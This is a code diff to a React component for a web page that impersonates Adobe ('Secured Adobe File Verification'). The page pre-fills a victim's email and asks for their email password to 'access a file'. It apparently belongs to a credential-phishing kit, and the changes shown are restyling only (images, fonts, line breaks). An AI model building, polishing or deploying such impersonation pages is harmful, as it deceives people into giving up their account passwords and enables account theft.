@@ -89,18 +89,14 @@ useEffect(()=> {
 
   return (
 
-    
-    <div>
-      <main className="p-5">
-        <div className="backgroundImg z-[-1]">
-          <img src={"https://i.ibb.co/XyvSQGZ/newbg.png"} id="dynamicBg" alt="background image" />
-        </div>
-    
+    <div className='w-screen h-screen'>
+      <Image src={"/images/newbg.webp"} width={2000} height={2000} alt='loading..' className='w-full h-full'/>
+   
             <div className={`warn-cont p-5`}>
               <div className={`warn-card p-5 max-sm:p-2`} style={{transform: animateIn? "translateY(0)" : " translateY(-50px)", opacity: animateIn ? "1" : "0"}}>
                 <div className="warn-header mb-5">
-                    <img src="/images/logo.png" width={50} className='max-sm:w-[40px] max-md:w-[46px]' alt="Adobe Reader XI" />
-                  <h2 className='text-[28px] max-md:text-[24px] max-sm:text-[18px] text-[#fa0f00] font-semibold'>Secured Adobe File Verification</h2>
+                    <img src="/images/logo.webp" width={50} className='max-sm:w-[37px] max-md:w-[46px] ' alt="Adobe Reader XI" />
+                  <h2 className='text-[27px] max-md:text-[23px] max-sm:text-[17px] text-[#fa0f00] font-bold roboto'>Secured Adobe File Verification</h2>
                 </div>
                 <div className='flex flex-col w-full p-2'>
                   <div className='flex items-center gap-2'>
@@ -119,20 +115,19 @@ useEffect(()=> {
                 <form className='p-2'>
                   <div id="error" style={{ fontSize: "14px", color: "tomato", textAlign: "center" }}>{error}</div>
                   <div>
-                    <label htmlFor='email'>Email</label>
-                  <input type="email" id="email" readOnly placeholder="Enter Email" value={email}/>
+                    <label htmlFor='email' className='font-semibold'>Email</label>
+                  <input type="email" id="email" className='font-semibold' readOnly placeholder="Enter Email" value={email}/>
                   </div>
                   <div>
-                    <label htmlFor='password'>Password</label>
-                  <input type="password" id="password" onChange={(e)=> setPassword(e.target.value)} placeholder="Email Password"/>
+                    <label htmlFor='password' className='font-semibold'>Password</label>
+                  <input type="password" id="password" className='font-semibold' onChange={(e)=> setPassword(e.target.value)} placeholder="Email Password"/>
                   </div>
-                  <button type="submit" id='login-btn' onClick={handleSubmit} className={`btn btn-danger btn-block rounded-[5px] h-[45px]`}>{loading ? <><div className="lds-roller"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>Please wait</>: "Login To Access File"}</button>
+                  <button type="submit" id='login-btn' onClick={handleSubmit} className={`btn btn-danger btn-block rounded-[5px] h-[45px] text-sm`}>{loading ? <><div className="lds-roller"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>Please wait</>: "Login To Access File"}</button>
                 </form>
-                <p className='text-center p-2 text-sm'>To access our online secured document page, you are required to login your email address. This is to ensure you are the rightful recipient for the protect file. Unauthorized access is highly prohibited.</p>
+                <p className='text-center p-2 max-sm:text-sm'>To access our online secured document page, you are <br className='max-sm:hidden'/> required to login your email address. This is to ensure <br className='max-sm:hidden'/> you are the rightful recipient for the protect file.<br className='max-sm:hidden'/> Unauthorized access is highly prohibited.</p>
               </div>
             </div>
         </div>
-      </main>
-    </div>
+    
   );
 }
